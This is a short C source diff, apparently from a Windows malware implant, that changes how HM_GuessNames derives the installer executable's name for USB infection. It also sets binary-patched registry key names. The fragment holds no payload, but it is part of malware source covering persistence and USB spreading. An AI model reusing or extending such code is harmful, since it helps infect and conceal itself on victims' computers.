@@ -1624,8 +1624,7 @@ BOOL HM_GuessNames()
 	// La chiave nel registry e' binary patchata
 	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
 	_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
-	// L'exe per l'infezione USB lo deriva dal nome del core64
-	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "I%s", H64DLL_NAME);
+	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", H4_HOME_DIR);
 
 	// Genera i nomi della shared memory in base alla chiave per-cliente
 	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
